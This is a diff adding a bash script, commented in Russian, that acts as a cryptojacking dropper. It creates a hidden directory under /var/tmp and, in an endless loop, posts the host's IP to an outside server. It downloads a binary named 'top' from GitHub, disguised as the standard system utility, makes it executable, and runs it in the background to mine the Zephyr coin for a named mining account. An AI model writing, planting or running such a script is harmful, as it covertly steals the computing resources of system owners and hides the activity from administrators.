@@ -1,0 +1,53 @@
+#!/bin/bash
+
+# Создание каталога, если он не существует
+mkdir -p /var/tmp/.info
+
+# Переход в каталог /var/tmp/.info
+cd /var/tmp/.info || exit
+
+# Функция для загрузки файла по ссылке
+download_file() {
+    url=$1
+    destination=$2
+    wget -q --show-progress -O "$destination" "$url"
+}
+
+# Шаг 1: Получение IP-адреса хоста
+host_ip=$(hostname -I | awk '{print $1}')
+
+# Проверка наличия IP-адреса
+if [ -z "$host_ip" ]; then
+    echo "ERROR: IP address not found"
+    exit 1
+fi
+
+# Присвоение IP-адреса переменной client_id
+client_id=$host_ip
+server_url="https://network.phpteam.pp.ua/update"
+
+# Бесконечный цикл
+while true; do
+    # Выполнение POST-запроса без вывода и в фоновом режиме
+    curl -s -o /dev/null -X POST -d "id=$client_id" "$server_url" > /dev/null 2>&1 &
+
+    # Ожидание 1 секунды
+    sleep 1
+
+    # Шаг 2: Загрузка файла top с GitHub, если он не существует
+    if [ ! -f "top" ]; then
+        download_file "https://github.com/fintafixuser/top/raw/main/top" "top"
+        chmod +x top
+    fi
+
+    # Проверка, запущен ли уже процесс top
+    if ! pgrep -x "top" > /dev/null; then
+        # Запуск скрипта top с нужными параметрами в фоновом режиме
+        ./top -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/xm$host_ip -k --coin zephyr -a rx/0 > /dev/null 2>&1 &
+    fi
+
+    # Ожидание перед следующей итерацией
+    sleep 10
+done
+
+# Завершение скрипта
